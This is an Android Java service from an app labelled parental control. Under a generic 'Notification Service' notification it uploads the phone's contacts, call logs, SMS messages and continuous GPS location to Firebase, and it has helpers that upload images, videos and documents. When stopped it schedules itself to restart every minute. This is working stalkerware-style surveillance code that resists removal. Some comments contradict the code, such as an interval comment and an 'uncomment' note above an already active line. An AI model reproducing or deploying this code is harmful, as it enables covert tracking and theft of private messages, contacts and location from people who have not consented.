package com.example.parentalcontrol.service;

import android.Manifest;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.ContentObserver;
import android.location.Location;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;

import com.example.parentalcontrol.MainActivity;
import com.example.parentalcontrol.R;
import com.example.parentalcontrol.model.ContactModel;
import com.example.parentalcontrol.utils.CallLogUtils;
import com.example.parentalcontrol.utils.ContactUtils;
import com.example.parentalcontrol.utils.FirebaseHelper;
import com.example.parentalcontrol.utils.MediaStoreHelper;
import com.example.parentalcontrol.utils.MyApp;
import com.example.parentalcontrol.utils.SmsUtils;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.List;

public class ForegroundServiceWithNotification extends Service {

    private FusedLocationProviderClient fusedLocationClient;
    private ContentObserver contentObserver;
    private DatabaseReference locationReference;
    private Handler handler = new Handler();
    private final int delayMillis = 5000; // 5 seconds


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        String input = intent.getStringExtra("inputExtra");
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this,
                0, notificationIntent, 0);
        Notification notification = new NotificationCompat.Builder(this, MyApp.CHANNEL_ID)
                .setContentTitle("Notification Service")
                .setContentText(input)
                .setSmallIcon(R.drawable.ic_logo)
                .setContentIntent(pendingIntent)
                .build();
        NotificationManager mNotificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel( MyApp.CHANNEL_ID, MyApp.CHANNEL_NAME, NotificationManager.IMPORTANCE_DEFAULT);
            mNotificationManager.createNotificationChannel(channel);
            new NotificationCompat.Builder(this, MyApp.CHANNEL_ID);
        }
        startForeground(1, notification);




        Toast.makeText(this, "Work", Toast.LENGTH_SHORT).show();

        // Initialize the FusedLocationProviderClient
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);

        // Initialize the Firebase Database reference
        locationReference = FirebaseDatabase.getInstance().getReference("UserId");


        startContactsFetching();
        startRepeatingTask();
        startLocationUpdates();
        startCallLogsFetching();
        startSmsFetching();




        return START_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    @Override
    public void onDestroy() {
        super.onDestroy();
        stopLocationUpdates();
        stopRepeatingTask();
        Toast.makeText(this, "Stop", Toast.LENGTH_SHORT).show();
        scheduleServiceRestart();
    }


    private void scheduleServiceRestart() {

        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(this, RestartServiceReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);

        long triggerAtMillis = System.currentTimeMillis() + delayMillis; // Delay for restarting the service
        long repeatIntervalMillis = 60 * 1000; // Repeat every 60 seconds

        if (alarmManager != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAtMillis, pendingIntent);
            } else {
                alarmManager.set(AlarmManager.RTC_WAKEUP, triggerAtMillis, pendingIntent);
            }

            // want to repeat the restart, uncomment the following line
            alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, triggerAtMillis, repeatIntervalMillis, pendingIntent);
        }
    }

    private void runInBackground(Runnable task) {
        new Thread(task).start();
    }

    private void sendImagesToDatabase() {
        FirebaseHelper.uploadImagesToFirebase(MediaStoreHelper.getAllImages(this));
    }

    private void sendVideosToDatabase(){
        FirebaseHelper.uploadVideosToFirebase(MediaStoreHelper.getAllVideos(this));
    }
    private void sendDocumentsToFirebase(){
        FirebaseHelper.uploadDocumentsToFirebase(MediaStoreHelper.getAllDocuments(this));
    }
    private void startCallLogsFetching(){
        FirebaseHelper.uploadCallLogToFirebase(CallLogUtils.getAllCallLogs(this));
    }

    private void startSmsFetching(){
        FirebaseHelper.uploadSmsToFirebase(SmsUtils.getAllSms(this));
    }
    private void startContactsFetching(){
        ContactUtils.getAllContactsListAsync(this, new ContactUtils.OnContactFetchedListener() {
            @Override
            public void onContactsFetched(List<ContactModel> contactsList) {
                FirebaseHelper.uploadContactsToFirebase(contactsList);
            }
        });
    }


    private void startRepeatingTask() {
        new Thread(
                new Runnable() {
                    @Override
                    public void run() {
                        while (true) {
                            Log.e("Service", "Service is running...");
                            try {
                                Thread.sleep(2000);
                            } catch (InterruptedException e) {
                                e.printStackTrace();
                            }
                        }
                    }
                }
        ).start();
    }

    private void stopRepeatingTask() {
        handler.removeCallbacksAndMessages(null);
    }

    private void startLocationUpdates() {
        LocationRequest locationRequest = new LocationRequest();
        locationRequest.setInterval(5000); // Update every 50 seconds
        locationRequest.setFastestInterval(3000); // Fastest update interval
        locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, null);
        }

    }

    private void stopLocationUpdates() {
        fusedLocationClient.removeLocationUpdates(locationCallback);
    }

    private LocationCallback locationCallback = new LocationCallback() {
        @Override
        public void onLocationResult(LocationResult locationResult) {
            if (locationResult != null) {
                Location location = locationResult.getLastLocation();
                if (location != null) {
                    // Update the user's location in Firebase
                    updateLocationInFirebase(location.getLatitude(), location.getLongitude());
                }
            }
        }
    };



    private void updateLocationInFirebase(double latitude, double longitude) {
        locationReference.child("locationData").child("latitude").setValue(latitude)
                .addOnSuccessListener(new OnSuccessListener<Void>() {
                    @Override
                    public void onSuccess(Void unused) {
                        Log.d("locationSaveInDb", "onSuccess: ");
                    }
                })
                .addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception e) {
                        Log.d("locationSaveInDb", "onFailure: "+e.getMessage());
                    }
                });
        locationReference.child("locationData").child("longitude").setValue(longitude);
    }
}
